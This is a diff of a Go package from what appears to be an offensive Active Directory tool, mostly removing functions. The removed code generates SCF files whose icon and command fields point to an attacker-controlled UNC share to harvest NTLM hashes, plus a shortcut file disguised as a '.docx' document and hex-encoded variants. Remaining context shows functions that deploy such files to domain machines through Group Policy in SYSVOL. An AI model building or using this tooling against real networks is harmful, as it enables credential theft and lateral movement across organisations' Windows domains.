@@ -1,12 +1,9 @@
 package gpo
 
 import (
-	"encoding/binary"
-	"encoding/hex"
 	"fmt"
 	"os"
 	"path/filepath"
-	"strings"
 	"time"
 )
 
@@ -70,27 +67,6 @@ CommandArgument=\\\\%s\\share\\payload.exe
 	return filePath, nil
 }
 
-func GenerateSCFHash(config *SCFConfig) (string, error) {
-	if config.OutputDir == "" {
-		config.OutputDir = "."
-	}
-
-	scfContent := fmt.Sprintf(`[Shell]
-Command=2
-IconFile=\\\\%s\\share\\icon.ico
-CommandArgument=\\\\%s\\share\\payload.exe
-`, config.Listener, config.Listener)
-
-	filename := fmt.Sprintf("scf_hash_%s_%d.scf", config.Target, time.Now().Unix())
-	filePath := config.OutputDir + "/" + filename
-
-	if err := os.WriteFile(filePath, []byte(scfContent), 0644); err != nil {
-		return "", fmt.Errorf("write SCF file: %w", err)
-	}
-
-	return filePath, nil
-}
-
 func GenerateLNK(config *LNKConfig) (string, error) {
 	if config.OutputDir == "" {
 		config.OutputDir = "."
@@ -123,58 +99,6 @@ func GenerateLNK(config *LNKConfig) (string, error) {
 	}
 
 	return filePath, nil
-}
-
-func GenerateLNKMSWord(config *LNKConfig) (string, error) {
-	if config.OutputDir == "" {
-		config.OutputDir = "."
-	}
-
-	filename := fmt.Sprintf("document_%s_%d.docx.lnk", config.Target, time.Now().Unix())
-	filePath := config.OutputDir + "/" + filename
-
-	content := fmt.Sprintf(`Windows Shortcut
-Target: %s
-Icon: %s
-Comment: %s
-`, config.Target, config.Icon, config.Comment)
-
-	if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
-		return "", fmt.Errorf("write LNK file: %w", err)
-	}
-
-	return filePath, nil
-}
-
-func GenerateSCFBinary(config *SCFConfig) ([]byte, error) {
-	scfContent := fmt.Sprintf(`[Shell]
-Command=2
-IconFile=\\\\%s\\share\\icon.ico
-CommandArgument=\\\\%s\\share\\payload.exe
-`, config.Listener, config.Listener)
-
-	return []byte(scfContent), nil
-}
-
-func GenerateLNKBinary(config *LNKConfig) ([]byte, error) {
-	lnk := &LNKFile{
-		CLSID: [16]byte{
-			0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
-			0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
-		},
-		Flags:          0x00000001,
-		FileAttributes: 0x00000020,
-		CreationTime:   getWindowsTime(time.Now()),
-		AccessTime:     getWindowsTime(time.Now()),
-		WriteTime:      getWindowsTime(time.Now()),
-		IconIndex:      0,
-		CommandFlags:   0x00000001,
-		ShowCommand:    1,
-		Name:           config.Target,
-		Target:         config.Target,
-	}
-
-	return lnk.Marshal(), nil
 }
 
 func (l *LNKFile) Marshal() []byte {
@@ -227,56 +151,6 @@ func appendUint64LE(buf []byte, v uint64) []byte {
 
 func appendInt32LE(buf []byte, v int32) []byte {
 	return appendUint32LE(buf, uint32(v))
-}
-
-func ParseSCF(content string) map[string]string {
-	result := make(map[string]string)
-	lines := strings.Split(content, "\n")
-	for _, line := range lines {
-		line = strings.TrimSpace(line)
-		if strings.HasPrefix(line, "[") || line == "" {
-			continue
-		}
-		if idx := strings.Index(line, "="); idx > 0 {
-			key := strings.TrimSpace(line[:idx])
-			value := strings.TrimSpace(line[idx+1:])
-			result[key] = value
-		}
-	}
-	return result
-}
-
-func ParseLNK(data []byte) (*LNKFile, error) {
-	if len(data) < 76 {
-		return nil, fmt.Errorf("LNK file too short")
-	}
-
-	lnk := &LNKFile{}
-	copy(lnk.CLSID[:], data[0:16])
-
-	lnk.Flags = binary.LittleEndian.Uint32(data[16:20])
-	lnk.FileAttributes = binary.LittleEndian.Uint32(data[20:24])
-	lnk.CreationTime = binary.LittleEndian.Uint64(data[24:32])
-	lnk.AccessTime = binary.LittleEndian.Uint64(data[32:40])
-	lnk.WriteTime = binary.LittleEndian.Uint64(data[40:48])
-	lnk.FileSize = binary.LittleEndian.Uint32(data[48:52])
-	lnk.IconIndex = int32(binary.LittleEndian.Uint32(data[52:56]))
-	lnk.CommandFlags = binary.LittleEndian.Uint32(data[56:60])
-	lnk.ShowCommand = binary.LittleEndian.Uint32(data[60:64])
-	lnk.HotKey = binary.LittleEndian.Uint16(data[64:66])
-	copy(lnk.Reserved[:], data[66:76])
-
-	offset := 76
-	if offset+2 <= len(data) {
-		nameLen := int(binary.LittleEndian.Uint16(data[offset : offset+2]))
-		offset += 2
-		if offset+nameLen <= len(data) {
-			lnk.Name = string(data[offset : offset+nameLen])
-			offset += nameLen
-		}
-	}
-
-	return lnk, nil
 }
 
 func DeploySCFViaGPO(gpoGUID, sysvolPath, listenerIP, target string) (string, error) {
@@ -348,28 +222,4 @@ func DeployLNKViaGPO(gpoGUID, sysvolPath, target, icon, comment string) (string,
 	return destFile, nil
 }
 
-func GenerateSCFHashString(listenerIP string) string {
-	return fmt.Sprintf(`[Shell]
-Command=2
-IconFile=\\\\%s\\share\\icon.ico
-CommandArgument=\\\\%s\\share\\payload.exe
-`, listenerIP, listenerIP)
-}
 
-func GenerateLNKString(target, icon, comment string) string {
-	return fmt.Sprintf(`Windows Shortcut
-Target: %s
-Icon: %s
-Comment: %s
-`, target, icon, comment)
-}
-
-func GenerateSCFHex(listenerIP string) string {
-	scf := GenerateSCFHashString(listenerIP)
-	return hex.EncodeToString([]byte(scf))
-}
-
-func GenerateLNKHex(target, icon, comment string) string {
-	lnk := GenerateLNKString(target, icon, comment)
-	return hex.EncodeToString([]byte(lnk))
-}
